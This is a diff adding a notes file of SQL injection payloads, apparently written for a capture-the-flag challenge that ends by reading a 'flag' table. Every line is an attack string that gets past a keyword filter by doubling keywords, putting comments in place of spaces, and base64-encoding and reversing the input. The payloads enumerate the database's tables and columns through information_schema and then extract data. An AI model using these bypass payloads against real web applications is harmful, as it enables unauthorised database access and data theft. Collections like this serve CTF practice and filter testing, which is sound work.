@@ -1,0 +1,13 @@
+selselectect/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1
+
+base64.b64encode('1/**/uniunionon/**/selselectect/**/(seleselectct/**/concat(0x7e,(),0x7e)),2,3,4,5,6')[::-1]
+
+
+tables:
+
+	base64.b64encode('1/**/uniunionon/**/selselectect/**/(seleselectct/**/concat(0x7e,(selselectect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema/**/like/**/database()),0x7e)),2,3,4,5,6')[::-1]
+	
+	seleselectct/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name/**/like/**/0x666C6167
+	
+	
+	seleselectct/**/flag/**/from/**/flag
